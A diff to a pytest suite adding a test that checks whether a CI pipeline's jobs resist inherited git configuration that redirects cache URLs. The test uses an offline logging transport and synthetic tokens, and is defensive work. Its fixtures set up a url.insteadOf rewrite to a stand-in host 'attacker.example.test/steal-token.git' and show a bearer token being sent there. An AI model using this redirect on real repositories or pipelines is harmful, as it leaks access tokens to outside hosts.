@@ -211,6 +211,132 @@ def test_a_pipeline_variable_cannot_replace_the_validated_job_selector(definitio
         assert result.returncode == 2 and "INFX_JOB differs from the job input" in result.stderr
 
 
+@pytest.mark.parametrize("configuration", ["environment", "parameters", "global", "system", "template"])
+@pytest.mark.parametrize(
+    "job,operation",
+    [
+        ("publish_candidate", "clone"),
+        ("promote", "clone"),
+        ("staleness", "clone"),
+        ("publish_candidate", "ls-remote"),
+        ("publish_candidate", "fetch"),
+        ("publish_candidate", "push"),
+        ("promote", "fetch"),
+        ("promote", "push"),
+    ],
+)
+def test_inherited_git_configuration_cannot_redirect_cache_credentials(
+    definition, tmp_path, configuration, job, operation
+):
+    cache_url = "https://cache.example.test/approved/aisim-infx-cache.git"
+    attacker_url = "https://attacker.example.test/steal-token.git"
+    token = "synthetic-reader" if job == "staleness" else "synthetic-writer"
+    header = f"Authorization: Bearer {token}"
+    env = {key: value for key, value in os.environ.items() if not key.startswith("GIT_")}
+    env.update({"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull})
+    source = tmp_path / "source"
+    subprocess.run(["git", "init", "-q", str(source)], env=env, check=True)
+    identity = ["-c", "user.name=Synthetic Fixture", "-c", "user.email=fixture@example.test"]
+    subprocess.run(
+        ["git", "-C", str(source), *identity, "commit", "-qm", "fixture", "--allow-empty"], env=env, check=True
+    )
+    pin = subprocess.check_output(["git", "-C", str(source), "rev-parse", "HEAD"], env=env, text=True).strip()
+
+    bin_dir = tmp_path / "bin"
+    bin_dir.mkdir()
+    log = tmp_path / "transport.jsonl"
+    # Real Git resolves insteadOf and propagates -c headers before starting this
+    # transport helper. Only HTTPS I/O is replaced; all credentials are synthetic.
+    helper = bin_dir / "git-remote-https"
+    helper.write_text(
+        f"#!{sys.executable}\n"
+        "import json, os, subprocess, sys\n"
+        "headers = subprocess.check_output(['git', 'config', '--get-all', 'http.extraHeader'], text=True)\n"
+        "with open(os.environ['GIT_TRANSPORT_LOG'], 'a') as log:\n"
+        "    log.write(json.dumps({'url': sys.argv[2], 'headers': headers.splitlines()}) + '\\n')\n"
+        "sys.exit(1)\n"
+    )
+    helper.chmod(0o755)
+    uv = bin_dir / "uv"
+    uv.write_text('#!/bin/sh\n[ "${INFX_CACHE_WRITE_TOKEN+x}" != x ] && [ "${INFX_CACHE_READ_TOKEN+x}" != x ]\n')
+    uv.chmod(0o755)
+    env.update(
+        {
+            "PATH": f"{bin_dir}:{os.environ['PATH']}",
+            "GIT_EXEC_PATH": str(bin_dir),
+            "GIT_TRANSPORT_LOG": str(log),
+            "CI_PROJECT_DIR": str(tmp_path),
+            "INFX_CACHE_WRITE_TOKEN": "synthetic-writer",
+            "INFX_CACHE_READ_TOKEN": "synthetic-reader",
+            "REF": "refs/heads/fixture",
+            "BRANCH": "fixture",
+            "SID": "b" * 64,
+        }
+    )
+    key = f"url.{attacker_url}.insteadOf"
+    control_root = tmp_path
+    if configuration == "environment":
+        env.update({"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": key, "GIT_CONFIG_VALUE_0": cache_url})
+    elif configuration == "parameters":
+        env["GIT_CONFIG_PARAMETERS"] = f"'{key}={cache_url}'"
+    else:
+        config = tmp_path / "template" / "config"
+        config.parent.mkdir()
+        config.write_text(f'[url "{attacker_url}"]\n\tinsteadOf = {cache_url}\n')
+        if configuration == "template":
+            env["GIT_TEMPLATE_DIR"] = str(config.parent)
+            control_root = tmp_path / "unisolated"
+            subprocess.run(["git", "init", "-q", str(control_root)], env=env, check=True)
+        else:
+            env[f"GIT_CONFIG_{configuration.upper()}"] = str(config)
+
+    # Positive control: this real Git invocation sends the header to the rewritten
+    # transport destination unless the job's configuration isolation runs first.
+    result = subprocess.run(
+        ["git", "-c", f"http.extraHeader={header}", "ls-remote", cache_url],
+        env=env,
+        cwd=control_root,
+        capture_output=True,
+    )
+    assert result.returncode != 0  # the offline transport deliberately stops here
+    assert [json.loads(line) for line in log.read_text().splitlines()] == [{"url": attacker_url, "headers": [header]}]
+    log.unlink()
+
+    # The setup's first block also checks that INFX_JOB equals the job input the pipeline was started with.
+    selector = {"publish_candidate": "ingest"}.get(job, job)
+    env["INFX_JOB"] = selector
+    setup = "\n".join(definition[".pinned"]["before_script"]).replace("$[[ inputs.job ]]", selector)
+    setup = (
+        setup.replace("REPLACE_WITH_REVIEWED_40_HEX_AISIM_COMMIT", pin)
+        .replace("REPLACE_WITH_APPROVED_HTTPS_CACHE_REPO_URL", cache_url)
+        .replace("https://github.com/ai-dynamo/aisim.git", source.as_uri())
+    )
+    if operation == "clone":
+        command = next(line for line in definition[job]["script"] if "clone -q --depth 1" in line)
+        command = command.replace("$[[ inputs.candidate-snapshot-id ]]", "b" * 64).replace(
+            "$[[ inputs.candidate-generation ]]", "42"
+        )
+    else:
+        # A real local cache checkout supplies origin and a pushable ref. The
+        # command under test still comes directly from the reviewed job script.
+        setup += (
+            "\ngit init -q -b fixture cache-repo\n"
+            'git -C cache-repo remote add origin "$INFX_CACHE_REPO_URL"\n'
+            'git -C cache-repo -c user.name="Synthetic Fixture" -c user.email=fixture@example.test '
+            "commit -qm fixture --allow-empty\n"
+        )
+        match = "ls-remote --heads" if operation == "ls-remote" else f"{operation} -q "
+        command = next(line.strip() for line in _text(definition[job]).splitlines() if match in line)
+        if job == "publish_candidate" or operation == "push":
+            setup += "cd cache-repo\n"
+    result = subprocess.run(
+        ["sh", "-eu", "-c", setup + "\n" + command], env=env, cwd=tmp_path, capture_output=True, text=True
+    )
+    assert result.returncode != 0  # only the offline transport should fail
+    assert log.exists(), result.stderr
+    assert [json.loads(line) for line in log.read_text().splitlines()] == [{"url": cache_url, "headers": [header]}]
+
+
 def test_ingestion_runs_without_the_cache_token_and_never_pushes_to_the_default_branch(definition):
     job = definition["publish_candidate"]
     text = _text(job)
